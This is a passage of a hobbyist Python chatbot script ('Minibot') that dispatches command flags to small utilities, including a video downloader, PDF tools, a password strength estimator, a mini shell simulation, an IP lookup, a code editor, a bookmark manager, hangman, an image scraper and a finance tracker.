Twitch (clips, videos)
SoundCloud
Dailymotion
TikTok
Reddit (videos in posts)
And many others...''')
            print("----------------------------------------")
            url = input('Enter the URL: ')
            ydl_opts = {'outtmpl': '%(title)s.%(ext)s'}
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.download([url])
            print("----------------------------------------")
        except ImportError:
            print("You need to install 'yt_dlp' to download videos. use 'pip install yt_dlp' or 'pip3 install yt-dlp'")
        return "Thanks for using Social Media Video Dowloader!"

    elif "-pdf" in ui:
        try:
            import PyPDF2
            from fpdf import FPDF
            from PIL import Image
            from pdf2image import convert_from_path
        except ImportError as e:
            print(f"Please install the following libraries to use this program: {str(e).split()[-1]}")
            print("To install, use the following commands:")
            print("pip install PyPDF2 or pip3 install PyPDF2")
            print("pip install fpdf or pip3 install fpdf")
            print("pip install Pillow or pip3 install Pillow")
            print("pip install pdf2image or pip3 install pdf2image")
            print("Also, make sure you have Poppler installed for pdf2image to work.")
            exit(1)

        import os
        def create_pdf(text, filename):
            # Create a PDF from text
            pdf = FPDF()
            pdf.set_auto_page_break(auto=True, margin=15)
            pdf.add_page()
            pdf.set_font("Arial", size=12)
            pdf.multi_cell(0, 10, text)
            pdf.output(filename)
            print(f"PDF '{filename}' created successfully.")

        def extract_text_from_pdf(pdf_path):
            # Extract text from a PDF
            try:
                with open(pdf_path, "rb") as file:
                    reader = PyPDF2.PdfReader(file)
                    text = ""
                    for page in reader.pages:
                        text += page.extract_text()
                    return text
            except Exception as e:
                print(f"Error: {e}")
                return None

        def extract_images_from_pdf(pdf_path, output_folder):
            # Extract images from a PDF
            images = convert_from_path(pdf_path)
            os.makedirs(output_folder, exist_ok=True)
            for i, image in enumerate(images):
                image_path = f"{output_folder}/image_{i+1}.png"
                image.save(image_path, 'PNG')
                print(f"Image {i+1} saved as '{image_path}'.")

        def main():
            while True:
                print("\nPDF Tools")
                print("1. Create PDF")
                print("2. Extract Text from PDF")
                print("3. Extract Images from PDF")
                print("4. Exit")
                
                choice = input("Choose an option: ")

                if choice == '1':
                    text = input("Enter the text for the PDF: ")
                    filename = input("Enter the PDF filename (e.g., myfile.pdf): ")
                    create_pdf(text, filename)
                
                elif choice == '2':
                    pdf_path = input("Enter the path to the PDF: ")
                    text = extract_text_from_pdf(pdf_path)
                    if text:
                        print("\nExtracted Text:")
                        print(text)
                    else:
                        print("Unable to extract text.")
                
                elif choice == '3':
                    pdf_path = input("Enter the path to the PDF: ")
                    output_folder = input("Enter the output folder for images: ")
                    extract_images_from_pdf(pdf_path, output_folder)
                
                elif choice == '4':
                    print("Exiting the program...")
                    break
                
                else:
                    print("Invalid choice. Please try again.")

        if __name__ == "__main__":
            main()

    elif "-pct" in ui:
        import math
        import string
        import time

        def calculate_strength(password):
            charset_size = 0

            # Define character sets
            if any(char.islower() for char in password):
                charset_size += len(string.ascii_lowercase)
            if any(char.isupper() for char in password):
                charset_size += len(string.ascii_uppercase)
            if any(char.isdigit() for char in password):
                charset_size += len(string.digits)
            if any(char in string.punctuation for char in password):
                charset_size += len(string.punctuation)

            # Total possible combinations
            total_combinations = math.pow(charset_size, len(password))

            # Assume 1 billion guesses per second
            guesses_per_second = 1_000_000_000
            crack_time_seconds = total_combinations / guesses_per_second

            return total_combinations, crack_time_seconds

        def format_time(seconds):
            # Convert seconds to a readable format
            if seconds < 60:
                return f"{seconds:.2f} seconds"
            elif seconds < 3600:
                return f"{seconds / 60:.2f} minutes"
            elif seconds < 86400:
                return f"{seconds / 3600:.2f} hours"
            elif seconds < 31536000:
                return f"{seconds / 86400:.2f} days"
            else:
                return f"{seconds / 31536000:.2f} years"

        def main():
            print("---- PASSWORD CRACK TIME ANALYZER ----")
            password = input("Enter a password to analyze: ")

            start_time = time.time()
            combinations, crack_time = calculate_strength(password)
            end_time = time.time()

            print("\nPassword Analysis:")
            print(f"- Total possible combinations: {int(combinations):,}")
            print(f"- Estimated crack time: {format_time(crack_time)}")
            print(f"- Analysis completed in {end_time - start_time:.2f} seconds.")

            if crack_time < 1:
                print("Warning: Your password is very weak!")
            elif crack_time < 3600:
                print("Suggestion: Use a longer and more complex password.")
            else:
                print("Great! Your password is strong.")

        if __name__ == "__main__":
            main()
            return "Thanks for using Password Crack Time Analyzer!"
    
    elif "-txr" in ui:
        print("-- TXT READER --")
        location = input("Enter Location (e.g., path/to/sus.txt): ")

        try:
            if not location.endswith(".txt"):
                raise ValueError("The file must be a .txt file!")
            
            with open(location, "r") as f:
                h = f.read()
                print("\nFile Content:\n")
                print(h)
        except FileNotFoundError:
            print("Error: The specified file was not found.")
        except ValueError as ve:
            print(f"Error: {ve}")
        except Exception as e:
            print(f"An error occurred: {e}")
        return "Done!"
    elif "-mls" in ui:
        import os
        import shutil
        import subprocess

        # ANSI escape codes for green text
        BLUE = "\033[32m"
        RESET = "\033[0m"

        # Define command functions
        def ls(path="."):
            if os.path.exists(path):
                return f"\n" + "\n".join(os.listdir(path)) + f"{RESET}"
            return "Directory not found."

        def cd(path):
            try:
                os.chdir(path)
                return f"{BLUE}Changed directory to {os.getcwd()}{RESET}"
            except FileNotFoundError:
                return "Directory not found."

        def pwd():
            return f"{BLUE}{os.getcwd()}{RESET}"

        def cp(src, dest):
            try:
                shutil.copy(src, dest)
                return f"{BLUE}Copied {src} to {dest}{RESET}"
            except FileNotFoundError:
                return "File not found."

        def mv(src, dest):
            try:
                shutil.move(src, dest)
                return f"{BLUE}Moved {src} to {dest}{RESET}"
            except FileNotFoundError:
                return "File not found."

        def rm(file):
            try:
                os.remove(file)
                return f"{BLUE}Removed {file}{RESET}"
            except FileNotFoundError:
                return "File not found."

        def cat(file):
            try:
                with open(file, "r") as f:
                    return f"{BLUE}" + f.read() + f"{RESET}"
            except FileNotFoundError:
                return "File not found."

        def grep(pattern, file):
            try:
                with open(file, "r") as f:
                    lines = f.readlines()
                matches = [line for line in lines if pattern in line]
                return f"{BLUE}" + "\n".join(matches) + f"{RESET}" if matches else f"Pattern '{pattern}' not found in {file}."
            except FileNotFoundError:
                return "File not found."

        def echo(text):
            return f"{BLUE}{text}{RESET}"

        def chmod(file, permissions):
            try:
                os.chmod(file, int(permissions, 8))
                return f"{BLUE}Changed permissions of {file} to {permissions}{RESET}"
            except FileNotFoundError:
                return "File not found."

        def df():
            return f"{BLUE}" + subprocess.getoutput("df -h") + f"{RESET}"

        def du(path="."):
            return f"{BLUE}" + subprocess.getoutput(f"du -sh {path}") + f"{RESET}"

        def nano(file):
            print("Enter text to write (type 'END' on a new line to save):")
            lines = []
            while True:
                line = input()
                if line == "END":
                    break
                lines.append(line)
            try:
                with open(file, "w") as f:
                    f.write("\n".join(lines))
                return f"{BLUE}Written to {file}{RESET}"
            except Exception as e:
                return f"Error: {e}"

        def find(name):
            return f"{BLUE}" + subprocess.getoutput(f"find . -name '{name}'") + f"{RESET}"

        # Command dictionary
        commands = {
            "ls": ls,
            "cd": cd,
            "pwd": pwd,
            "cp": cp,
            "mv": mv,
            "rm": rm,
            "cat": cat,
            "grep": grep,
            "echo": echo,
            "chmod": chmod,
            "df": df,
            "du": du,
            "nano": nano,
            "find": find,
            "help": lambda: show_commands(),
        }

        def show_commands():
            return f"Available commands: " + ", ".join(commands.keys()) + f"{RESET} ('-exit' to quit & -def to see commands usecase)"

        # Main loop to execute commands
        def main():
            print("Welcome to the Mini Linux Simulation!")
            print(show_commands())
            while True:
                try:
                    user_input = input(f"{BLUE}{os.getcwd()} ${RESET} ").strip()
                    if user_input == "-exit":
                        print(f"{BLUE}Exiting terminal. {RESET}")
                        break

                    parts = user_input.split()
                    command = parts[0]
                    args = parts[1:]

                    if command in commands:
                        result = commands[command](*args) if args else commands[command]()
                        print(result)
                    elif user_input == "-def":
                        print("""
[USECASE OF THESE COMMANDS]

ls: for listing files | ls /path/to/directory
cd: for changing directory | cd /path/to/directory
pwd: for printing current directory | pwd
cp: for copying files | cp source_file destination
mv: for moving files | mv source_file destination
rm: for removing files | rm file_name
cat: for displaying file content | cat file_name
grep: for searching text in files | grep 'pattern' file_name
echo: for printing text | echo 'text'
chmod: for changing file permissions | chmod 755 file_name
df: for checking disk space | df
du: for checking disk usage of a directory | du /path/to/directory
nano: for editing files in terminal | nano file_name
find: for searching files | find . -name 'file_name'
help: for displaying available commands | help
"""), 
                    else:
                        print("Command not found. Type 'help' to see available commands.")
                except Exception as e:
                    print(f"Error: {e}")

        if __name__ == "__main__":
            main()
        return "Thanks for using Mini Linux Simulation!"
    
    elif "-ip" in ui:
            try:
                import requests
                def get_public_ip():
                    try:
                        # Getting the public IP using httpbin.org
                        response = requests.get('https://httpbin.org/ip')
                        data = response.json()
                        return data['origin']
                    except requests.exceptions.RequestException as e:
                        print(f"Error fetching public IP: {e}")
                        return None

                def get_ip_info(ip):
                    try:
                        # Sending request to ipinfo.io to get details about the IP
                        url = f"https://ipinfo.io/{ip}/json"
                        response = requests.get(url)
                        data = response.json()

                        # Extracting information from the response
                        ip_address = data.get('ip', 'N/A')
                        hostname = data.get('hostname', 'N/A')
                        city = data.get('city', 'N/A')
                        region = data.get('region', 'N/A')
                        country = data.get('country', 'N/A')
                        loc = data.get('loc', 'N/A')  # Latitude and longitude
                        org = data.get('org', 'N/A')

                        # Displaying the information
                        print(f"IP Address: {ip_address}")
                        print(f"Hostname: {hostname}")
                        print(f"City: {city}")
                        print(f"Region: {region}")
                        print(f"Country: {country}")
                        print(f"Location: {loc}")
                        print(f"Organization: {org}")

                    except Exception as e:
                        print(f"Error: {e}")

                def main():
                    while True:
                        print("----- IP Looker -----")
                        print("1. Get details for your public IP.")
                        print("2. Enter any IP to look up.")
                        print("3. Exit.")

                        choice = input("Choose an option (1/2/3): ")

                        if choice == '1':
                            # Get the public IP of the user
                            public_ip = get_public_ip()
                            if public_ip:
                                print(f"Your Public IP Address: {public_ip}")
                                # Get and display details for the public IP
                                get_ip_info(public_ip)
                            else:
                                print("Could not fetch public IP.")
                        elif choice == '2':
                            ip = input("Enter the IP address you want to look up: ")
                            get_ip_info(ip)
                        elif choice == '3':
                            print("Exiting...")
                            break
                        else:
                            print("Invalid choice. Please select a valid option.")
                if __name__ == "__main__":
                    main()
                return "Done!"
            except ImportError:
                return("Please install 'requests' library. 'pip install requests' or 'pip3 install requests'")

    elif "-abt" in ui:
        return """
Chatbot Name: \033[34mMinibot\033[0m

Internet: Not Required (In most cases)

Third Party Python Libraries:
- bs4 (BeautifulSoup)
- cryptography
- fpdf
- PIL (Pillow)
- psutil
- PyPDF2
- requests
- schedule
- yt_dlp
- qrcode
- pyzipper
- pygame

Built-in Python Libraries:
- calendar
- cgi
- collections
- http.server
- builtins
- keyword
- math
- os
- pathlib
- platform
- re
- secrets
- shutil
- socket
- sqlite3
- string
- subprocess
- sys
- time
- tkinter
- datetime 
- urllib.parse

Purpose:  
\033[34mMinibot\033[0m is an offline Python chatbot designed to assist with:  
- Answering queries related to technology, programming, and general topics.  
- Offering personalized responses for customizatiion.  
- Providing 80+ commands tools for versatile use.  

Features:  
- Lightweight and offline (some tools requires internet), ensuring privacy.  
- Easy-to-use interface with rapid responses.  
- Expandable functionality for future updates.  

Version: 1.0.0  

Developed by: LUCKYS1NGHH (Github) & Email - luckysingh71826@gmail.com 

Acknowledgments:  
Built with Python. Inspired by ChatGPT & Linux.
"""

    elif "-fdb" in ui:
        return "For Feedback, Email At: luckysingh71826@gmail.com"
    
    elif "-mpy" in ui:
        import tkinter as tk
        from tkinter import filedialog, messagebox
        import keyword
        import subprocess
        import threading
        print("New Window Opening For Mini Python Compiler!")
        class PythonCodeEditor(tk.Tk):
            def __init__(self):
                super().__init__()

                self.title("Python Code Editor")
                self.geometry("900x650")
                self.configure(bg="#1F1F1F")

                self.filename = None

                # Dark theme colors
                self.bg_color = "#111211"
                self.text_color = "#D3D3D3"
                self.output_bg_color = "#2a2b2b"
                self.output_text_color = "#D3D3D3"

                # Create a frame for the editor and line numbers
                self.editor_frame = tk.Frame(self, bg="#2E2E2E")
                self.editor_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)

                # Create a canvas for the line numbers
                self.line_number_canvas = tk.Canvas(self.editor_frame, width=40, bg=self.bg_color, bd=0, highlightthickness=0)
                self.line_number_canvas.grid(row=0, column=0, sticky="ns")

                # Create text area for the code editor with dark theme
                self.text_area = tk.Text(self.editor_frame, wrap=tk.WORD, undo=True, font=("Courier", 12), bg=self.bg_color, fg=self.text_color, insertbackground='white', bd=0, highlightthickness=0)
                self.text_area.grid(row=0, column=1, sticky="nsew", padx=10)

                # Create text area for output display with dark theme
                self.output_area = tk.Text(self, height=10, wrap=tk.WORD, font=("Courier", 12), bg=self.output_bg_color, fg=self.output_text_color, bd=0, highlightthickness=0)
                self.output_area.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)

                # Create "Run Code" button with modern style
                self.execute_button = tk.Button(self, text="Run Code", command=self.execute_code, bg="#4CAF50", fg="white", font=("Arial", 12), relief="flat", padx=20, pady=10)
                self.execute_button.grid(row=0, column=1, sticky="ne", padx=10, pady=10)

                # Set up the menu
                self.create_menu()

                # Bind events
                self.text_area.bind("<KeyRelease>", self.syntax_highlight)
                self.text_area.bind("<KeyRelease>", self.update_line_numbers)

                # Configure row and column weights for resizing
                self.grid_rowconfigure(0, weight=1)
                self.grid_rowconfigure(1, weight=0)
                self.grid_columnconfigure(0, weight=1)
                self.grid_columnconfigure(1, weight=0)

                self.update_line_numbers()

            def create_menu(self):
                menu_bar = tk.Menu(self, bg="#333", fg="#FFF")

                file_menu = tk.Menu(menu_bar, tearoff=0, bg="#333", fg="#FFF")
                file_menu.add_command(label="New", command=self.new_file)
                file_menu.add_command(label="Open", command=self.open_file)
                file_menu.add_command(label="Save", command=self.save_file)
                file_menu.add_command(label="Save As", command=self.save_as_file)
                file_menu.add_separator()
                file_menu.add_command(label="Exit", command=self.quit)

                menu_bar.add_cascade(label="File", menu=file_menu)

                self.config(menu=menu_bar)

            def new_file(self):
                self.filename = None
                self.text_area.delete(1.0, tk.END)
                self.output_area.delete(1.0, tk.END)

            def open_file(self):
                file_path = filedialog.askopenfilename(defaultextension=".py", filetypes=[("Python files", "*.py"), ("All files", "*.*")])
                if file_path:
                    self.filename = file_path
                    with open(file_path, 'r') as file:
                        self.text_area.delete(1.0, tk.END)
                        self.text_area.insert(tk.END, file.read())
                    self.output_area.delete(1.0, tk.END)

            def save_file(self):
                if self.filename:
                    with open(self.filename, 'w') as file:
                        file.write(self.text_area.get(1.0, tk.END))
                else:
                    self.save_as_file()

            def save_as_file(self):
                file_path = filedialog.asksaveasfilename(defaultextension=".py", filetypes=[("Python files", "*.py"), ("All files", "*.*")])
                if file_path:
                    self.filename = file_path
                    with open(file_path, 'w') as file:
                        file.write(self.text_area.get(1.0, tk.END))

            def syntax_highlight(self, event=None):
                text = self.text_area.get(1.0, tk.END)
                self.text_area.tag_remove("keyword", 1.0, tk.END)
                self.text_area.tag_remove("comment", 1.0, tk.END)

                # Highlight keywords
                for kw in keyword.kwlist:
                    start_idx = "1.0"
                    while True:
                        start_idx = self.text_area.search(kw, start_idx, stopindex=tk.END, nocase=1)
                        if not start_idx:
                            break
                        end_idx = f"{start_idx}+{len(kw)}c"
                        self.text_area.tag_add("keyword", start_idx, end_idx)
                        self.text_area.tag_config("keyword", foreground="blue")
                        start_idx = end_idx

                # Highlight comments (simple approach)
                start_idx = "1.0"
                while True:
                    start_idx = self.text_area.search("#", start_idx, stopindex=tk.END)
                    if not start_idx:
                        break
                    end_idx = self.text_area.search("\n", start_idx, stopindex=tk.END)
                    if not end_idx:
                        end_idx = tk.END
                    self.text_area.tag_add("comment", start_idx, end_idx)
                    self.text_area.tag_config("comment", foreground="green")
                    start_idx = end_idx

            def execute_code(self):
                # Disable the button to prevent multiple clicks during execution
                self.execute_button.config(state=tk.DISABLED)

                code = self.text_area.get(1.0, tk.END)
                self.output_area.delete(1.0, tk.END)  # Clear previous output

                # Run the code in a separate thread
                threading.Thread(target=self.run_code, args=(code,)).start()

            def run_code(self, code):
                try:
                    # Run the code using subprocess to capture stdout and stderr
                    result = subprocess.run(['python', '-c', code], capture_output=True, text=True)
                    if result.returncode == 0:
                        self.output_area.insert(tk.END, result.stdout)  # Show standard output
                    else:
                        self.output_area.insert(tk.END, result.stderr)  # Show error if there's one
                except Exception as e:
                    self.output_area.insert(tk.END, str(e))  # Display any exceptions in the output area

                # Re-enable the "Run Code" button after execution
                self.execute_button.config(state=tk.NORMAL)

            def update_line_numbers(self, event=None):
                """Update line numbers in the editor."""
                line_count = int(self.text_area.index('end-1c').split('.')[0])
                self.line_number_canvas.delete("all")
                
                for i in range(1, line_count + 1):
                    self.line_number_canvas.create_text(2, (i * 20), anchor="nw", text=str(i), fill="#B0B0B0", font=("Courier", 10))

        if __name__ == "__main__":
            app = PythonCodeEditor()
            #app.mainloop()
        return("Thanks for Using Mini Python Code Compiler!")

    elif "-dsv" in ui:
        import os
        from pathlib import Path
        from datetime import datetime
        print("--- DIRECTORY STATS VIEWER ---")
        def format_size(size_in_bytes):
            """Convert size from bytes to a human-readable format (KB, MB, GB)."""
            if size_in_bytes == 0:
                return "0 KB"
            size_names = ["Bytes", "KB", "MB", "GB", "TB"]
            size_index = 0
            size = size_in_bytes
            while size >= 1024 and size_index < len(size_names) - 1:
                size /= 1024
                size_index += 1
            return f"{size:.2f} {size_names[size_index]}"

        def get_folder_details(folder_path, recursive=False):
            """Get details of files and folders in a given folder, with optional recursion."""
            folder = Path(folder_path)
            
            if not folder.exists() or not folder.is_dir():
                print(f"Folder not found: {folder_path}")
                return
            
            print(f"Details of files and folders in: {folder}\n")
            print(f"{'Name':<40} {'Type':<10} {'Size':<15} {'Last Modified':<25}")
            print("-" * 90)
            
            try:
                # Using os.scandir() for more efficient directory traversal
                for entry in os.scandir(folder):
                    entry_type = "Folder" if entry.is_dir() else "File"
                    
                    if entry.is_file():
                        size = format_size(entry.stat().st_size)
                    else:
                        size = "-"
                    
                    last_modified_time = datetime.fromtimestamp(entry.stat().st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                    
                    print(f"{entry.name:<40} {entry_type:<10} {size:<15} {last_modified_time:<25}")
                    
                    # Recursively check subfolders if the option is enabled
                    if recursive and entry.is_dir():
                        get_folder_details(entry.path, recursive=True)

            except PermissionError:
                print(f"Permission error while accessing: {folder_path}")
            except Exception as e:
                print(f"An error occurred: {e}")
        if __name__ == "__main__":
            folder_to_check = input("Enter the folder path: ")
            recursive_input = input("Do you want to check subdirectories? (yes/no): ").strip().lower()
            recursive = recursive_input == "yes"
            
            get_folder_details(folder_to_check, recursive)
            return "Thanks for using Directory Stats Viewer!"

    elif "-url" in ui:
        import json
        import os

        class BookmarkManager:
            def __init__(self, filename="bookmarks.json"):
                self.filename = filename
                self.bookmarks = {}
                self.load_bookmarks()

            def load_bookmarks(self):
                if os.path.exists(self.filename):
                    with open(self.filename, "r") as file:
                        self.bookmarks = json.load(file)
                else:
                    self.bookmarks = {}

            def save_bookmarks(self):
                with open(self.filename, "w") as file:
                    json.dump(self.bookmarks, file, indent=4)

            def add_bookmark(self, category, name, url):
                if category not in self.bookmarks:
                    self.bookmarks[category] = []
                self.bookmarks[category].append({"name": name, "url": url})
                self.save_bookmarks()
                print(f"Bookmark '{name}' added under category '{category}'.")

            def remove_bookmark(self, category, name):
                if category in self.bookmarks:
                    for bookmark in self.bookmarks[category]:
                        if bookmark["name"] == name:
                            self.bookmarks[category].remove(bookmark)
                            self.save_bookmarks()
                            print(f"Bookmark '{name}' removed from category '{category}'.")
                            return
                print(f"Bookmark '{name}' not found in category '{category}'.")

            def list_bookmarks(self):
                if not self.bookmarks:
                    print("No bookmarks found.")
                    return

                for category, bookmarks in self.bookmarks.items():
                    print(f"Category: {category}")
                    for bookmark in bookmarks:
                        print(f"  - {bookmark['name']}: {bookmark['url']}")

            def search_bookmarks(self, keyword):
                results = []
                for category, bookmarks in self.bookmarks.items():
                    for bookmark in bookmarks:
                        if keyword.lower() in bookmark["name"].lower() or keyword.lower() in bookmark["url"].lower():
                            results.append((category, bookmark["name"], bookmark["url"]))

                if results:
                    print("Search Results:")
                    for category, name, url in results:
                        print(f"Category: {category}, Name: {name}, URL: {url}")
                else:
                    print("No bookmarks found for the given keyword.")

            def edit_bookmark(self, category, old_name, new_name, new_url):
                if category in self.bookmarks:
                    for bookmark in self.bookmarks[category]:
                        if bookmark["name"] == old_name:
                            bookmark["name"] = new_name
                            bookmark["url"] = new_url
                            self.save_bookmarks()
                            print(f"Bookmark '{old_name}' updated to '{new_name}' with new URL '{new_url}'.")
                            return
                print(f"Bookmark '{old_name}' not found in category '{category}'.")

        def main():
            manager = BookmarkManager()

            while True:
                print("--- URL BOOKMARK MANAGER ---")
                print("1. Add Bookmark")
                print("2. Remove Bookmark")
                print("3. List Bookmarks")
                print("4. Search Bookmarks")
                print("5. Edit Bookmark")
                print("6. Exit")
                print("------------------------")

                choice = input("Choose an option: ")

                if choice == "1":
                    category = input("Enter category: ")
                    name = input("Enter bookmark name: ")
                    url = input("Enter bookmark URL: ")
                    manager.add_bookmark(category, name, url)
                elif choice == "2":
                    category = input("Enter category: ")
                    name = input("Enter bookmark name to remove: ")
                    manager.remove_bookmark(category, name)
                elif choice == "3":
                    manager.list_bookmarks()
                elif choice == "4":
                    keyword = input("Enter keyword to search: ")
                    manager.search_bookmarks(keyword)
                elif choice == "5":
                    category = input("Enter category: ")
                    old_name = input("Enter existing bookmark name: ")
                    new_name = input("Enter new bookmark name: ")
                    new_url = input("Enter new bookmark URL: ")
                    manager.edit_bookmark(category, old_name, new_name, new_url)
                elif choice == "6":
                    break
                else:
                    print("Invalid choice. Please try again.")

        if __name__ == "__main__":
            main()
        return "Done!"

    elif "-hgm" in ui:
        import random
        def display_hangman(tries):
            stages = [
                """
                --------
                |      |
                |      O
                |     \\\|/
                |      |
                |     / \\
                """,
                """
                --------
                |      |
                |      O
                |     \\\|/
                |      |
                |     / 
                """,
                """
                --------
                |      |
                |      O
                |     \\\|/
                |      |
                |      
                """,
                """
                --------
                |      |
                |      O
                |     \\\|
                |      |
                |      
                """,
                """
                --------
                |      |
                |      O
                |      |
                |      |
                |      
                """,
                """
                --------
                |      |
                |      O
                |      
                |      
                |      
                """,
                """
                --------
                |      |
                |      
                |      
                |      
                |      
                """
            ]
            return stages[tries]

        def get_word():
            word_list = ["python", "developer", "hangman", "challenge", "programming", "player", "laptop", "bottle", "group"]
            return random.choice(word_list).upper()

        def hangman():
            print("Welcome to Hangman!")
            word = get_word()
            word_letters = set(word)  # Unique letters in the word
            alphabet = set('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
            guessed_letters = set()

            tries = 6

            while len(word_letters) > 0 and tries > 0:
                print(display_hangman(tries))
                print("Guessed letters: ", " ".join(sorted(guessed_letters)))
                word_display = [letter if letter in guessed_letters else "_" for letter in word]
                print("Word: ", " ".join(word_display))

                guess = input("Guess a letter: ").upper()
                if guess in alphabet - guessed_letters:
                    guessed_letters.add(guess)
                    if guess in word_letters:
                        word_letters.remove(guess)
                        print(f"Good job! '{guess}' is in the word!")
                    else:
                        tries -= 1
                        print(f"Wrong! '{guess}' is not in the word. You have {tries} tries left.")
                elif guess in guessed_letters:
                    print("You already guessed that letter. Try again.")
                else:
                    print("Invalid input. Please guess a letter.")

            if tries == 0:
                print(display_hangman(tries))
                print(f"You lost! The word was {word}.")
            else:
                print(f"Congratulations! You guessed the word {word}!")

        if __name__ == "__main__":
            hangman()
            return "Hope you liked playing the Hangman Game!"

    elif "-img" in ui:
        import os
        from urllib.parse import urljoin, urlparse
        from pathlib import Path
        try:
            import requests
            from bs4 import BeautifulSoup
            def download_images_from_url(url, folder="images", allowed_extensions=None):
                """
                Downloads all images from a given URL and saves them in a specified folder.
                
                Args:
                    url (str): The URL of the website to scrape images from.
                    folder (str): The folder where the images will be saved. Defaults to "images".
                    allowed_extensions (set): A set of allowed image file extensions (e.g., {'jpg', 'png'}). Default is None.
                """
                if allowed_extensions is None:
                    allowed_extensions = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'}
                
                # Ensure the folder exists
                if not os.path.exists(folder):
                    os.makedirs(folder, exist_ok=True)
                
                try:
                    # Fetch and parse the page content
                    response = requests.get(url)
                    response.raise_for_status()
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all image tags
                    img_tags = soup.find_all('img')
                    print(f"Found {len(img_tags)} images on the page.")
                    
                    downloaded_count = 0
                    for i, img_tag in enumerate(img_tags, start=1):
                        img_url = img_tag.get('src')
                        if not img_url:
                            continue  # Skip if no src attribute
                        
                        # Resolve full image URL
                        img_url = urljoin(url, img_url)
                        
                        # Check if the file extension is allowed
                        parsed_url = urlparse(img_url)
                        ext = Path(parsed_url.path).suffix.lower().lstrip('.')
                        if ext not in allowed_extensions:
                            print(f"Skipped: {img_url} (Unsupported format: .{ext})")
                            continue
                        
                        try:
                            # Download the image
                            img_response = requests.get(img_url, stream=True)
                            img_response.raise_for_status()
                            
                            # Create a file path for the image
                            img_name = f"image_{i}.{ext}"
                            img_path = os.path.join(folder, img_name)
                            
                            with open(img_path, 'wb') as img_file:
                                for chunk in img_response.iter_content(1024):
                                    img_file.write(chunk)
                            
                            downloaded_count += 1
                            print(f"Downloaded: {img_url} -> {img_path}")
                        except Exception as e:
                            print(f"Failed to download {img_url}: {e}")
                    
                    print(f"\nDownload completed. Total images saved: {downloaded_count}")
                except requests.RequestException as e:
                    print(f"Error fetching URL {url}: {e}")
                except Exception as e:
                    print(f"An unexpected error occurred: {e}")
            if __name__ == "__main__":
                print("Image Downloader")
                print("----------------")
                # Get input URL from the user
                url = input("Enter the URL to scrape images from: ").strip()
                
                # Get folder location from user
                folder = input("Enter the folder path to save images (e.g., 'C:/images'): ").strip()
                
                # Ensure the folder exists or create it
                if not os.path.exists(folder):
                    os.makedirs(folder)
                    print(f"Created folder: {folder}")
                else:
                    print(f"Folder already exists: {folder}")
                
                # Start the download process
                download_images_from_url(url, folder=folder)
        except ImportError:
            return("You need to install 'bs4' and 'requests' library to use this tool! use 'pip install <library>' or 'pip3 install <library>'.")
            return "Done!"

    elif "-pft" in ui:
        import sqlite3
        import calendar
        from datetime import datetime

        class FinanceTracker:
            def __init__(self):
                try:
                    # Connect to SQLite database (or create it if it doesn't exist)
                    self.conn = sqlite3.connect('finance_tracker.db')
                    self.cursor = self.conn.cursor()

                    # Create the transactions table if it doesn't already exist
                    self.cursor.execute('''
                        CREATE TABLE IF NOT EXISTS transactions (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            type TEXT NOT NULL,
                            amount REAL NOT NULL,
                            category TEXT NOT NULL,
                            description TEXT NOT NULL,
                            date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                        )
                    ''')

                    # Create a table for budgets if it doesn't exist
                    self.cursor.execute('''
                        CREATE TABLE IF NOT EXISTS budgets (
                            category TEXT PRIMARY KEY,
                            amount REAL NOT NULL
                        )
                    ''')

                    self.conn.commit()
                except sqlite3.DatabaseError as e:
                    print(f"Database error: {e}")
                    exit(1)

            def add_transaction(self, t_type, amount, category, description):
                """ Add income or expense transaction """
                try:
                    self.cursor.execute('''
                        INSERT INTO transactions (type, amount, category, description) 
                        VALUES (?, ?, ?, ?)
                    ''', (t_type, amount, category, description))
                    self.conn.commit()
                except sqlite3.DatabaseError as e:
                    print(f"Error adding transaction: {e}")

            def add_income(self, amount, category, description="Income"):
                """ Add income transaction """
                if amount <= 0:
                    print("Amount must be positive!")
                    return
                self.add_transaction('Income', amount, category, description)

            def add_expense(self, amount, category, description="Expense"):
                """ Add expense transaction """
                if amount <= 0:
                    print("Amount must be positive!")
                    return
                
                # Check if the user has enough balance before adding an expense
                try:
                    self.cursor.execute('''
                        SELECT SUM(amount) FROM transactions WHERE type = 'Income'
                    ''')
                    total_income = self.cursor.fetchone()[0] or 0.0
                except sqlite3.DatabaseError as e:
                    print(f"Error checking balance: {e}")
                    return

                if amount > total_income:
                    print("Insufficient funds!")
                else:
                    self.add_transaction('Expense', -amount, category, description)

            def view_balance(self):
                """ View current balance """
                try:
                    self.cursor.execute('''
                        SELECT SUM(amount) FROM transactions
                    ''')
                    balance = self.cursor.fetchone()[0] or 0.0
                    print(f"Current Balance: ${balance:.2f}")
                except sqlite3.DatabaseError as e:
                    print(f"Error viewing balance: {e}")

            def view_transactions(self):
                """ View all transactions """
                try:
                    self.cursor.execute('''
                        SELECT type, amount, category, description, date FROM transactions ORDER BY date DESC
                    ''')
                    transactions = self.cursor.fetchall()
                    
                    if not transactions:
                        print("No transactions recorded.")
                    else:
                        print("\nTransaction History:")
                        for transaction in transactions:
                            print(f"{transaction[0]}: ${transaction[1]:.2f} - {transaction[2]} - {transaction[3]} (on {transaction[4]})")
                except sqlite3.DatabaseError as e:
                    print(f"Error viewing transactions: {e}")

            def monthly_summary(self, month=None, year=None):
                    """ View a monthly summary of income and expenses """
                    if not month:
                        month = datetime.now().month
                    if not year:
                        year = datetime.now().year

                    # Calculate start and end dates for the month
                    start_date = f"{year}-{month:02d}-01"
                    end_date = f"{year}-{month:02d}-{calendar.monthrange(year, month)[1]}"

                    try:
                        # Query to summarize income and expenses for the given month
                        self.cursor.execute('''
                            SELECT type, SUM(amount), category 
                            FROM transactions 
                            WHERE date BETWEEN ? AND ? 
                            GROUP BY type, category
                        ''', (start_date, end_date))

                        print(f"\nSummary for {calendar.month_name[month]} {year}:")
                        summary = self.cursor.fetchall()

                        if not summary:
                            print("No transactions for this month.")
                            return

                        # Initialize totals
                        total_income = 0
                        total_expense = 0

                        # Process and print results
                        for record in summary:
                            transaction_type, total_amount, category = record
                            if transaction_type == 'Income':
                                total_income += total_amount
                            elif transaction_type == 'Expense':
